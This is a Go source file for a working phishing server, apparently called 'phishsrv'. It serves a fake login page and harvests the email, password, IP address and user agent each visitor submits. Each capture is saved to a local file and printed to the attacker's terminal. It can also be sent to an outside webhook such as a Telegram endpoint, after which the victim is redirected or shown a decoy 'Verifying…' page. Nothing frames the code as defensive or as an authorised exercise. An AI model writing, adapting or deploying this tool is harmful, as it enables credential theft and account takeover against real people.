package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

type Cred struct {
	Time     string `json:"time"`
	Email    string `json:"email"`
	Password string `json:"password"`
	IP       string `json:"ip"`
	UA       string `json:"ua"`
	Ref      string `json:"ref"`
}

const (
	cReset  = "\033[0m"
	cRed    = "\033[1;31m"
	cGreen  = "\033[1;32m"
	cYellow = "\033[1;33m"
	cCyan   = "\033[1;36m"
	cGray   = "\033[1;30m"
)

var (
	port     = flag.String("port", "8080", "listen port")
	outFile  = flag.String("out", "captures.jsonl", "append captures here")
	tplPath  = flag.String("tpl", "templates/login.html", "login page template")
	redirect = flag.String("redirect", "", "url to send user after capture (optional)")
	webhook  = flag.String("webhook", "", "POST each capture as JSON here (optional)")
	tag      = flag.String("tag", "", "label to tag captures (optional)")
)

func main() {
	flag.Parse()

	tpl, err := os.ReadFile(*tplPath)
	if err != nil {
		log.Fatalf("template read: %v", err)
	}

	mux := http.NewServeMux()

	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Header().Set("Cache-Control", "no-store")
		w.Write(tpl)
	})

	mux.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Redirect(w, r, "/", http.StatusFound)
			return
		}
		_ = r.ParseForm()

		c := Cred{
			Time:     time.Now().UTC().Format(time.RFC3339),
			Email:    strings.TrimSpace(r.FormValue("email")),
			Password: r.FormValue("password"),
			IP:       clientIP(r),
			UA:       r.UserAgent(),
			Ref:      *tag,
		}

		// 1) local append
		saveLocal(c)

		// 2) live terminal print
		printLive(c)

		// 3) webhook to Kali / Telegram / anywhere
		if *webhook != "" {
			go pushWebhook(c)
		}

		// 4) redirect or silent page
		if *redirect != "" {
			http.Redirect(w, r, *redirect, http.StatusFound)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		io.WriteString(w, `<!doctype html><html><body style="font-family:system-ui;background:#0f1115;color:#e6e6e6;display:grid;place-items:center;height:100vh;margin:0"><h2>Verifying…</h2></body></html>`)
	})

	addr := ":" + *port
	log.Printf("%sphishsrv up%s on %s%s%s  tpl=%s  out=%s", cGreen, cReset, cCyan, addr, cReset, *tplPath, *outFile)
	if *webhook != "" {
		log.Printf("%swebhook -> %s%s", cYellow, *webhook, cReset)
	}
	log.Fatal(http.ListenAndServe(addr, mux))
}

func saveLocal(c Cred) {
	f, err := os.OpenFile(*outFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		log.Printf("%ssave error: %v%s", cRed, err, cReset)
		return
	}
	defer f.Close()
	b, _ := json.Marshal(c)
	f.Write(append(b, '\n'))
}

func printLive(c Cred) {
	bar := strings.Repeat("─", 46)
	fmt.Printf("\n%s%s%s\n", cGray, bar, cReset)
	fmt.Printf("%s[+] CAPTURE %s%s  %s\n", cGreen, c.Time, cReset, cGray+c.IP+cReset)
	fmt.Printf("    email    : %s%s%s\n", cYellow, c.Email, cReset)
	fmt.Printf("    password : %s%s%s\n", cRed, c.Password, cReset)
	if c.UA != "" {
		fmt.Printf("    ua       : %s%s%s\n", cGray, truncate(c.UA, 70), cReset)
	}
	if c.Ref != "" {
		fmt.Printf("    tag      : %s\n", c.Ref)
	}
	fmt.Printf("%s%s%s\n", cGray, bar, cReset)
}

func pushWebhook(c Cred) {
	b, _ := json.Marshal(c)
	req, err := http.NewRequest("POST", *webhook, bytes.NewReader(b))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Phish-Tag", *tag)
	client := &http.Client{Timeout: 6 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("%swebhook fail: %v%s", cRed, err, cReset)
		return
	}
	resp.Body.Close()
}

func clientIP(r *http.Request) string {
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		return strings.TrimSpace(strings.Split(xff, ",")[0])
	}
	if xr := r.Header.Get("X-Real-IP"); xr != "" {
		return xr
	}
	host := r.RemoteAddr
	if i := strings.LastIndex(host, ":"); i > 0 {
		host = host[:i]
	}
	return host
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

func init() {
	if d := filepath.Dir(*tplPath); d != "" && d != "." {
		_ = os.MkdirAll(d, 0755)
	}
}
